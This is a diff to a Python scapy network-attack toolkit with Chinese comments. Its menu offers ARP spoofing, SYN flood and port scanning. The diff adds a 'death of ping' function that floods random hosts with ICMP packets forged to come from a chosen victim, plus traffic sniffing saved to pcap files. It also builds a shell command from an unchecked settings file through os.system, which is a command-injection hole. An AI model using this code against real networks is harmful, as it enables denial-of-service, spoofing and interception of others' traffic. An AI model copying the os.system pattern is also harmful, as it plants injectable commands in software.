@@ -1,6 +1,7 @@
 #The program must be run in utf-8. 必须以UTF-8编码运行程序。
 try:
     from scapy.all import *#要用的模块有scapy没有就在命令行跑这条命令windows:python -m pip install scapy liunx:sudo python -m pip install scapy
+    from scapy.utils import PcapReader, PcapWriter
 except:
     print("你是不是忘了安装scapy模块")
     print("scapy安装命令windows:python -m pip install scapy liunx:sudo python -m pip install scapy")
@@ -18,15 +19,19 @@ except:
     input("按回车退出")
     sys.exit(0)
 
-import time, random, sys, uuid#导入需要的自带模块
+import time, random, sys, uuid, os#导入需要的自带模块
 
 print("The program must be run in utf-8.")#不知道为什么总有人用其他编码导致中文出问题。
 print("必须以UTF-8编码运行程序")
 print("所有模块都可以按ctrl + c 退出")#为什么还有人不知道ctrl + c的神奇组合
 
-mac=uuid.UUID(int = uuid.getnode()).hex[-12:] 
+mac=uuid.UUID(int = uuid.getnode()).hex[-12:]#获取本机MAC地址
 mac = ":".join([mac[e:e+2] for e in range(0,11,2)])
 print(mac)
+
+file = open("color.setting",'r')#让用户可以选择程序运行时的颜色
+color = file.read()
+os.system("color " + color)
 
 def ARP_poof(): #ARP欺骗带ARPPing(内网用)。
     target = input("Enter the target IP like 127.0.0.1:")#目标输入不用我多说把。
@@ -91,15 +96,48 @@ def nmap_port_scan():#nmap扫描所有端口状态
             for port in lport:
                 print('port:%s\tstate:%s'%(port,nm[host][proto][port]['state']))
 
+def DCHP_attack():
+    pass
+
+def death_ping():
+    target = input("Enter the target like 127.0.0.1:")
+    while True:
+        pdst = "%i.%i.%i.%i" %(random.randint(1,254),random.randint(1,254),random.randint(1,254),random.randint(1,254))
+        send(IP(src=target,dst=pdst)/ICMP())
+
+def scapy_sniff():
+    data = sniff(prn=lambda x:x.summary())#scapy的sniff嗅探
+    print("Start analyzing packets...")
+    file = "sniff_data/" + time.strftime('%Y_%m_%d_%H_%M_%S') + ".pcap"
+    writer = PcapWriter(file, append = True)
+    for i in data:
+        writer.write(i)
+    writer.flush()
+    writer.close()
+
+def read_pcap():
+    file_name = input("Enter the pcap file name like 2019_11_02_16_55_22.pcap:")
+    file_name = "sniff_data/" + file_name
+    reader = PcapReader(file_name)
+    packets = reader.read_all(-1)
+    for i in packets:
+        i.show()
+
 while True:#喜闻乐见的主循环
     print("quit(0)")
     print("ARPspoof with ARPPing.(1)")
     print("SYN flood(2)")
     print("All port status scans(3)")
+    print("Death of Ping(4)")
+    print("Sniff(5)")
+    print("Read Save pcap file(6)")
     print("退出(0)")
     print("ARP欺骗带ARPPing(内网用)。(1)")
     print("SYN洪水(2)")
     print("所有端口状态扫描(3)")
+    print("死亡之Ping(4)")
+    print("sniff嗅探(5)")
+    print("读取已保存的pcap文件 注:推荐使用Wireshark(6)")
 
     choose = input(">>>")#用户选择输入
     try:
@@ -115,3 +153,9 @@ while True:#喜闻乐见的主循环
         SYN_flood()
     elif choose == 3:
         nmap_port_scan()
+    elif choose == 4:
+        death_ping()
+    elif choose == 5:
+        scapy_sniff()
+    elif choose == 6:
+        read_pcap()
